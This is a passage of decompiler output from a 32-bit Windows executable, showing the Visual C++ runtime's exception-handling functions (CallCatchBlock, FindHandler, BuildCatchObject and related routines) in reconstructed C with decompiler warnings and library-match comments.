    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_00413157(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  FUN_0040f486();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void Catch_All_00413188(void)

{
  code *pcVar1;
  _ptiddata p_Var2;
  int unaff_EBP;
  
  p_Var2 = __getptd();
  p_Var2->_curexcspec = *(void **)(unaff_EBP + 8);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00416fe8;
  uStack_c = 0x4131ac;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_004132c6();
  return local_20;
}



void FUN_004132c6(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2008 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          _memmove(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        _memmove(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_004133c1;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_004133c1:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2008 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  TypeDescriptor *pTVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  int iVar4;
  _s_TryBlockMapEntry *p_Var5;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint extraout_var;
  uint uVar6;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var2 = __getptd();
    uVar6 = extraout_var;
    if (p_Var2->_translator != (void *)0x0) {
      p_Var2 = __getptd();
      pvVar3 = (void *)__encoded_null();
      if (((p_Var2->_translator != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&
         (iVar4 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar4 != 0)) {
        return;
      }
    }
    if (param_5->nTryBlocks == 0) {
      _inconsistency();
    }
    p_Var5 = _GetRangeOfTrysToCheck(param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff4);
    if (local_8 < uVar6) {
      do {
        if ((p_Var5->tryLow <= param_6) && (param_6 <= p_Var5->tryHigh)) {
          pTVar1 = p_Var5->pHandlerArray[p_Var5->nCatches + -1].pType;
          if (((pTVar1 == (TypeDescriptor *)0x0) || (*(char *)&pTVar1[1].pVFTable == '\0')) &&
             ((*(byte *)&p_Var5->pHandlerArray[p_Var5->nCatches + -1].adjectives & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)uVar6);
          }
        }
        local_8 = local_8 + 1;
        p_Var5 = p_Var5 + 1;
      } while (local_8 < uVar6);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  int *piVar1;
  _s_FuncInfo *p_Var2;
  uchar uVar3;
  bool bVar4;
  _ptiddata p_Var5;
  int iVar6;
  _s_TryBlockMapEntry *p_Var7;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var8;
  _s_FuncInfo **pp_Var9;
  int unaff_ESI;
  _s_FuncInfo *p_Var10;
  _s_TryBlockMapEntry *unaff_EDI;
  EHRegistrationNode *pEVar11;
  bad_exception in_stack_ffffffd0;
  uint local_20;
  int local_1c;
  _s_FuncInfo *local_18;
  uint local_14;
  HandlerType *local_10;
  int local_c;
  char local_5;
  
  local_5 = '\0';
  if (param_5->maxState < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (param_5->maxState <= local_c)) {
    _inconsistency();
  }
  p_Var10 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_004139b2;
  p_Var8 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_0041381f;
  iVar6 = *(int *)(param_1 + 0x14);
  if (((iVar6 != 0x19930520) && (iVar6 != 0x19930521)) && (iVar6 != 0x19930522)) goto LAB_0041381f;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_0041381f;
  p_Var5 = __getptd();
  if (p_Var5->_curexception != (void *)0x0) {
    p_Var5 = __getptd();
    param_1 = (EHExceptionRecord *)p_Var5->_curexception;
    p_Var5 = __getptd();
    param_3 = (_CONTEXT *)p_Var5->_curcontext;
    iVar6 = _ValidateRead(param_1,1);
    if (iVar6 == 0) {
      _inconsistency();
    }
    if ((((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3)) &&
        ((iVar6 = *(int *)((int)param_1 + 0x14), iVar6 == 0x19930520 ||
         ((iVar6 == 0x19930521 || (iVar6 == 0x19930522)))))) && (*(int *)((int)param_1 + 0x1c) == 0)
       ) {
      _inconsistency();
    }
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec == (void *)0x0) goto LAB_0041381f;
    p_Var5 = __getptd();
    piVar1 = (int *)p_Var5->_curexcspec;
    p_Var5 = __getptd();
    iVar6 = 0;
    p_Var5->_curexcspec = (void *)0x0;
    uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI);
    if (uVar3 != '\0') goto LAB_0041381f;
    p_Var8 = (_s_FuncInfo *)0x0;
    if (0 < *piVar1) {
      do {
        bVar4 = type_info::operator==
                          (*(type_info **)((int)&p_Var8->maxState + piVar1[1]),
                           (type_info *)&std::bad_exception::RTTI_Type_Descriptor);
        if (bVar4) goto LAB_004137f0;
        iVar6 = iVar6 + 1;
        p_Var8 = (_s_FuncInfo *)&p_Var8->pTryBlockMap;
      } while (iVar6 < *piVar1);
    }
    do {
      terminate();
LAB_004137f0:
      ___DestructExceptionObject((int *)param_1);
      std::bad_exception::bad_exception((bad_exception *)&stack0xffffffd0,"bad exception");
      __CxxThrowException_8(&stack0xffffffd0,&DAT_0041704c);
LAB_0041381f:
      p_Var10 = (_s_FuncInfo *)param_1;
      if (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3)) &&
         ((p_Var2 = *(_s_FuncInfo **)(param_1 + 0x14), p_Var2 == p_Var8 ||
          ((p_Var2 == (_s_FuncInfo *)0x19930521 || (p_Var2 == (_s_FuncInfo *)0x19930522)))))) {
        if (param_5->nTryBlocks != 0) {
          p_Var7 = _GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_20);
          for (; local_14 < local_20; local_14 = local_14 + 1) {
            if ((p_Var7->tryLow <= local_c) && (local_c <= p_Var7->tryHigh)) {
              local_10 = p_Var7->pHandlerArray;
              for (local_1c = p_Var7->nCatches; 0 < local_1c; local_1c = local_1c + -1) {
                pp_Var9 = *(_s_FuncInfo ***)(*(int *)(param_1 + 0x1c) + 0xc);
                for (local_18 = *pp_Var9; 0 < (int)local_18;
                    local_18 = (_s_FuncInfo *)((int)&local_18[-1].EHFlags + 3)) {
                  pp_Var9 = pp_Var9 + 1;
                  p_Var10 = *pp_Var9;
                  iVar6 = ___TypeMatch((byte *)local_10,(byte *)p_Var10,*(uint **)(param_1 + 0x1c));
                  if (iVar6 != 0) {
                    local_5 = '\x01';
                    CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                            p_Var10,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,unaff_EDI,
                            unaff_ESI,unaff_EBX,(uchar)in_stack_ffffffd0);
                    goto LAB_00413908;
                  }
                }
                local_10 = local_10 + 1;
              }
            }
LAB_00413908:
            p_Var7 = p_Var7 + 1;
          }
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject((int *)param_1);
        }
        if ((((local_5 != '\0') || ((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930521))
            || (param_5->pESTypeList == (ESTypeList *)0x0)) ||
           (uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI), uVar3 != '\0'))
        goto LAB_004139de;
        __getptd();
        __getptd();
        p_Var5 = __getptd();
        p_Var5->_curexception = param_1;
        p_Var5 = __getptd();
        p_Var5->_curcontext = param_3;
        pEVar11 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar11 = param_2;
        }
        _UnwindNestedFrames(pEVar11,param_1);
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_00413157(param_5->pESTypeList);
        p_Var10 = param_5;
      }
LAB_004139b2:
      if (param_5->nTryBlocks == 0) goto LAB_004139de;
      p_Var8 = param_5;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var10,param_2,param_3,param_4,param_5,local_c,param_7,param_8)
    ;
LAB_004139de:
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
  return;
}



undefined4 * __thiscall FUN_004139f6(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_exception::vftable;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((*(byte *)&param_5->EHFlags & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
          (param_5->pESTypeList != (ESTypeList *)0x0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,param_5,param_8,param_6,
                    param_7);
      }
    }
    else if ((param_5->maxState != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00418df8 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}


